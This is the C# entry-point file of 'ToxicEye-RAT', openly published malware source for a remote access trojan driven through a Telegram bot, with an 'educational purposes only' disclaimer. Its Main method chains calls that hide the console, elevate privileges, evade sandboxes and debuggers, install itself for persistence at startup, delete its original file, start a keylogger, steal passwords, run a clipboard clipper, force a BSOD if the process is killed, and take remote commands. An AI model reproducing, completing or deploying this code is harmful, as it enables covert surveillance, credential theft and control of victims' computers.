/* 
       ^ Author    : LimerBoy
       ^ Name      : ToxicEye-RAT
       ^ Github    : https:github.com/LimerBoy

       > This program is distributed for educational purposes only.
*/


using System;

namespace TelegramRAT
{
    class Program
    {
        [STAThreadAttribute]
        static void Main(string[] args)
        {
            //Console.ReadLine();
            //Environment.Exit(1);

            // Hide console
            persistence.HideConsoleWindow();
            // Mutex check
            persistence.CheckMutex();
            // SSL
            System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Ssl3 | System.Net.SecurityProtocolType.Tls | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls12;
            // Get admin rights
            persistence.elevatePrevileges();
            // Delay before starting
            persistence.Sleep();
            // Check if on VirtualBox, Sandbox or Debugger
            persistence.runAntiAnalysis();
            // Install to system & hide directory
            persistence.installSelf();
            // Add to startup
            persistence.setAutorun();
            // Delete file after first start
            persistence.MeltFile();
            // Check internet connection
            utils.isConnectedToInternet();
            // Check for blocked process
            persistence.processCheckerThread.Start();
            // Start offline keylogger
            utils.keyloggerThread.Start();
            // Steal all passwords & data on first start
            AutoStealer.AutoStealerThread.Start();
            // Start clipper
            Clipper.Run();
            // Protect process (BSOD)
            persistence.protectProcess();
            persistence.PreventSleep();
            // Send 'online' to telegram bot
            telegram.sendConnection();
            // Wait for new commands
            telegram.waitCommandsThread.Start();
            // Need for system power events
            var shutdownForm = new persistence.MainForm();
            System.Windows.Forms.Application.Run(shutdownForm);
        }
    }
}
